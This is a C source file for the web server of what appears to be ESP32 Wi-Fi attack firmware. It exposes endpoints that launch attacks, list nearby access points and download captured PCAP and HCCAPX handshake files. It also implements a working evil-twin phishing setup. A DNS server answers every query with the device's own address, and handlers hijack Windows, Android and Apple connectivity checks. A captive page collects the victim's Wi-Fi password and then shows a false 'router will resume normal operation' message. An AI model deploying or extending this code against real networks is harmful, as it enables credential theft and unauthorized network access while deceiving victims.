/**
 * @file webserver.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 *
 * @brief Implements Webserver component and all available enpoints.
 */
#include "webserver.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "attack.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

#include "pages/page_index.h"
#include "pages/page_captive.h"
#include "attack_evil_twin.h"
#include "lwip/sockets.h"
#include "lwip/err.h"
#include "lwip/sys.h"

static const char* TAG = "webserver";
ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);

static bool dns_running = false;
static int dns_socket = -1;
static bool s_portal_acknowledged = false;

static void dns_server_task(void *pvParameters) {
    uint8_t rx_buffer[512];
    struct sockaddr_in server_addr;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(53);

    dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (dns_socket < 0) {
        ESP_LOGE(TAG, "Unable to create socket: errno %d", errno);
        vTaskDelete(NULL);
        return;
    }

    if (bind(dns_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        ESP_LOGE(TAG, "Socket unable to bind: errno %d", errno);
        close(dns_socket);
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "DNS server started on port 53");
    dns_running = true;

    while (dns_running) {
        struct sockaddr_in source_addr;
        socklen_t socklen = sizeof(source_addr);
        int len = recvfrom(dns_socket, rx_buffer, sizeof(rx_buffer), 0, (struct sockaddr *)&source_addr, &socklen);

        if (len < 0) {
            ESP_LOGE(TAG, "recvfrom failed: errno %d", errno);
            break;
        }

        if (len > 12) {
            rx_buffer[2] |= 0x80;
            rx_buffer[3] = 0x80;
            rx_buffer[7] = 1;

            int pos = len;
            rx_buffer[pos++] = 0xc0;
            rx_buffer[pos++] = 0x0c;
            rx_buffer[pos++] = 0x00;
            rx_buffer[pos++] = 0x01;
            rx_buffer[pos++] = 0x00;
            rx_buffer[pos++] = 0x01;
            rx_buffer[pos++] = 0x00;
            rx_buffer[pos++] = 0x00;
            rx_buffer[pos++] = 0x00;
            rx_buffer[pos++] = 0x3c;
            rx_buffer[pos++] = 0x00;
            rx_buffer[pos++] = 0x04;
            rx_buffer[pos++] = 192;
            rx_buffer[pos++] = 168;
            rx_buffer[pos++] = 4;
            rx_buffer[pos++] = 1;

            sendto(dns_socket, rx_buffer, pos, 0, (struct sockaddr *)&source_addr, sizeof(source_addr));
        }
    }

    if (dns_socket != -1) {
        close(dns_socket);
        dns_socket = -1;
    }
    vTaskDelete(NULL);
}

void dns_server_start() {
    s_portal_acknowledged = false;
    if (!dns_running) {
        xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5, NULL);
    }
}

void dns_server_stop() {
    dns_running = false;
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    sendto(s, "stop", 4, 0, (struct sockaddr *)&addr, sizeof(addr));
    close(s);
}

// ─── Root / Index ─────────────────────────────────────────────────────────────

static esp_err_t uri_root_get_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    const attack_status_t *status = attack_get_status();
    if (status->type == ATTACK_TYPE_EVIL_TWIN && status->state == RUNNING) {
        char buf[128];
        if (httpd_req_get_url_query_str(req, buf, sizeof(buf)) == ESP_OK) {
            if (strstr(buf, "check=1")) {
                httpd_resp_set_status(req, "302 Found");
                httpd_resp_set_hdr(req, "Location", "/?error=1");
                return httpd_resp_send(req, NULL, 0);
            }
        }
        s_portal_acknowledged = true;
        const char *ssid = attack_evil_twin_get_ssid();  // get current target SSID
        char page_buf[PAGE_CAPTIVE_MAX_SIZE];
        page_captive_generate(page_buf, sizeof(page_buf), ssid ? ssid : "Wi-Fi");
        httpd_resp_set_type(req, "text/html");
        return httpd_resp_send(req, page_buf, strlen(page_buf));
    }
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
    return httpd_resp_send(req, (const char *)page_index, page_index_len);
}

static httpd_uri_t uri_root_get = {
    .uri = "/",
    .method = HTTP_GET,
    .handler = uri_root_get_handler,
    .user_ctx = NULL
};

// ─── Reset ────────────────────────────────────────────────────────────────────

static esp_err_t uri_reset_head_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_RESET, NULL, 0, portMAX_DELAY));
    return httpd_resp_send(req, NULL, 0);
}

static httpd_uri_t uri_reset_head = {
    .uri = "/reset",
    .method = HTTP_HEAD,
    .handler = uri_reset_head_handler,
    .user_ctx = NULL
};

// ─── AP List ──────────────────────────────────────────────────────────────────

static esp_err_t uri_ap_list_get_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    wifictl_scan_nearby_aps();

    const wifictl_ap_records_t *ap_records;
    ap_records = wifictl_get_ap_records();

    char resp_chunk[40];
    ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
    for(unsigned i = 0; i < ap_records->count; i++){
        memcpy(resp_chunk, ap_records->records[i].ssid, 33);
        memcpy(&resp_chunk[33], ap_records->records[i].bssid, 6);
        memcpy(&resp_chunk[39], &ap_records->records[i].rssi, 1);
        ESP_ERROR_CHECK(httpd_resp_send_chunk(req, resp_chunk, 40));
    }
    return httpd_resp_send_chunk(req, resp_chunk, 0);
}

static httpd_uri_t uri_ap_list_get = {
    .uri = "/ap-list",
    .method = HTTP_GET,
    .handler = uri_ap_list_get_handler,
    .user_ctx = NULL
};

// ─── Run Attack ───────────────────────────────────────────────────────────────

static esp_err_t uri_run_attack_post_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    attack_request_t attack_request;
    httpd_req_recv(req, (char *)&attack_request, sizeof(attack_request_t));
    esp_err_t res = httpd_resp_send(req, NULL, 0);
    ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST, &attack_request, sizeof(attack_request_t), portMAX_DELAY));
    return res;
}

static httpd_uri_t uri_run_attack_post = {
    .uri = "/run-attack",
    .method = HTTP_POST,
    .handler = uri_run_attack_post_handler,
    .user_ctx = NULL
};

// ─── Status ───────────────────────────────────────────────────────────────────

static esp_err_t uri_status_get_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    ESP_LOGD(TAG, "Fetching attack status...");
    const attack_status_t *attack_status;
    attack_status = attack_get_status();

    ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
    ESP_ERROR_CHECK(httpd_resp_send_chunk(req, (char *) attack_status, 4));
    if(((attack_status->state == FINISHED) || (attack_status->state == TIMEOUT)) && (attack_status->content_size > 0)){
        ESP_ERROR_CHECK(httpd_resp_send_chunk(req, attack_status->content, attack_status->content_size));
    }
    return httpd_resp_send_chunk(req, NULL, 0);
}

static httpd_uri_t uri_status_get = {
    .uri = "/status",
    .method = HTTP_GET,
    .handler = uri_status_get_handler,
    .user_ctx = NULL
};

// ─── Captive Portal ───────────────────────────────────────────────────────────

static esp_err_t uri_captive_portal_post_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    char buf[128];
    int ret, remaining = req->content_len;
    if (remaining >= sizeof(buf)) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Content too long");
        return ESP_FAIL;
    }
    ret = httpd_req_recv(req, buf, remaining);
    if (ret <= 0) return ESP_FAIL;
    buf[ret] = '\0';

    char password[64] = "";
    char *p = strstr(buf, "password=");
    if (p) {
        p += 9;
        char *end = strchr(p, '&');
        if (end) *end = '\0';
        strncpy(password, p, sizeof(password) - 1);
    }

    if (attack_evil_twin_check_password(password)) {
        httpd_resp_set_type(req, "text/html");
        return httpd_resp_send(req,
            "<!DOCTYPE html><html><head><meta charset=\"UTF-8\">"
            "<style>body{font-family:Arial,sans-serif;text-align:center;padding:40px;background:#f0f0f0;}"
            "h1{color:green;}</style></head><body>"
            "<h1>&#10003; Password accepted!</h1>"
            "<p>Thank you. Your router will now resume normal operation.</p>"
            "</body></html>", -1);
    }

    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, page_captive_verifying, strlen(page_captive_verifying));
}

static httpd_uri_t uri_captive_portal_post = {
    .uri = "/captive_portal",
    .method = HTTP_POST,
    .handler = uri_captive_portal_post_handler,
    .user_ctx = NULL
};

// ─── Windows NCSI ─────────────────────────────────────────────────────────────

static esp_err_t uri_ncsi_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    if (s_portal_acknowledged) {
        httpd_resp_set_type(req, "text/plain");
        return httpd_resp_send(req, "Microsoft Connect Test", -1);
    }
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    return httpd_resp_send(req, NULL, 0);
}

static httpd_uri_t uri_ncsi = {
    .uri = "/connecttest.txt",
    .method = HTTP_GET,
    .handler = uri_ncsi_handler,
    .user_ctx = NULL
};

static esp_err_t uri_ncsi_redirect_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    return httpd_resp_send(req, NULL, 0);
}

static httpd_uri_t uri_ncsi_redirect = {
    .uri = "/redirect",
    .method = HTTP_GET,
    .handler = uri_ncsi_redirect_handler,
    .user_ctx = NULL
};

static esp_err_t uri_ncsi_legacy_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    return httpd_resp_send(req, NULL, 0);
}

static httpd_uri_t uri_ncsi_legacy = {
    .uri = "/ncsi.txt",
    .method = HTTP_GET,
    .handler = uri_ncsi_legacy_handler,
    .user_ctx = NULL
};

// ─── Android Connectivity Check ───────────────────────────────────────────────

static esp_err_t uri_generate_204_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_status(req, "204 No Content");
    return httpd_resp_send(req, NULL, 0);
}

static httpd_uri_t uri_generate_204 = {
    .uri = "/generate_204",
    .method = HTTP_GET,
    .handler = uri_generate_204_handler,
    .user_ctx = NULL
};

// ─── Catch-all redirect ───────────────────────────────────────────────────────

static esp_err_t uri_catch_all_get_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Connection", "close");
    char host_buf[64] = {0};
    if (httpd_req_get_hdr_value_str(req, "Host", host_buf, sizeof(host_buf)) == ESP_OK) {
        if (strstr(host_buf, "msftconnecttest") || strstr(host_buf, "msftncsi") ||
            strstr(host_buf, "connectivitycheck") || strstr(host_buf, "captive.apple")) {
            httpd_resp_set_status(req, "511 Network Authentication Required");
            httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
            return httpd_resp_send(req, NULL, 0);
        }
    }
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
    return httpd_resp_send(req, NULL, 0);
}

static httpd_uri_t uri_catch_all_get = {
    .uri = "*",
    .method = HTTP_GET,
    .handler = uri_catch_all_get_handler,
    .user_ctx = NULL
};

// ─── PCAP / HCCAPX downloads ──────────────────────────────────────────────────

static esp_err_t uri_capture_pcap_get_handler(httpd_req_t *req){
    httpd_resp_set_hdr(req, "Connection", "close");
    ESP_LOGD(TAG, "Providing PCAP file...");
    ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
    return httpd_resp_send(req, (char *) pcap_serializer_get_buffer(), pcap_serializer_get_size());
}

static httpd_uri_t uri_capture_pcap_get = {
    .uri = "/capture.pcap",
    .method = HTTP_GET,
    .handler = uri_capture_pcap_get_handler,
    .user_ctx = NULL
};

static esp_err_t uri_capture_hccapx_get_handler(httpd_req_t *req){
    httpd_resp_set_hdr(req, "Connection", "close");
    ESP_LOGD(TAG, "Providing HCCAPX file...");
    ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
    return httpd_resp_send(req, (char *) hccapx_serializer_get(), sizeof(hccapx_t));
}

static httpd_uri_t uri_capture_hccapx_get = {
    .uri = "/capture.hccapx",
    .method = HTTP_GET,
    .handler = uri_capture_hccapx_get_handler,
    .user_ctx = NULL
};

// ─── Webserver init ───────────────────────────────────────────────────────────

void webserver_run(){
    ESP_LOGD(TAG, "Running webserver");

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 15;
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.max_open_sockets = 4;
    config.lru_purge_enable = true;
    config.backlog_conn = 5;
    config.recv_wait_timeout = 3;
    config.send_wait_timeout = 3;

    httpd_handle_t server = NULL;
    ESP_ERROR_CHECK(httpd_start(&server, &config));

    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_root_get));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_reset_head));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_ap_list_get));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_run_attack_post));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_status_get));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_captive_portal_post));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_capture_pcap_get));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_capture_hccapx_get));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_ncsi));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_ncsi_redirect));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_ncsi_legacy));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_generate_204));
    ESP_ERROR_CHECK(httpd_register_uri_handler(server, &uri_catch_all_get));
}